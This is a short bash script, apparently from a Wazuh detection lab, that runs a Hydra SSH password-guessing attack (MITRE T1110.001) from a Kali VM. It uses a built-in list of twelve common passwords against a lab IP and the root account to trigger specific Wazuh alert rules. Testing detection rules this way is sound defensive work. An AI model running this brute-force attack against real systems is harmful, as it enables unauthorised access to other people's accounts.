#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1110.001 — Brute Force: Password Guessing
# Technique    : Hydra SSH brute force avec wordlist courte
# Génère       : Wazuh rule 5710 (répétées) → rule 5712 (level 10)
#                + règle custom 100001 (5 tentatives en 30s)
# Run depuis   : Kali VM
# Usage        : bash 03_ssh_brute_force.sh [IP_CIBLE] [USER]
# ──────────────────────────────────────────────────────────────────

TARGET=${1:-192.168.56.102}
SSH_USER=${2:-root}

# Wordlist minimaliste pour déclencher l'alerte rapidement
WORDLIST=$(mktemp)
cat > "$WORDLIST" <<'EOF'
password
123456
admin
root
wazuh
kali
test
letmein
qwerty
welcome
alpine
Password1
EOF

echo "[*] Hydra SSH brute force — $SSH_USER@$TARGET"
hydra -l "$SSH_USER" -P "$WORDLIST" -t 4 -V "$TARGET" ssh

rm -f "$WORDLIST"
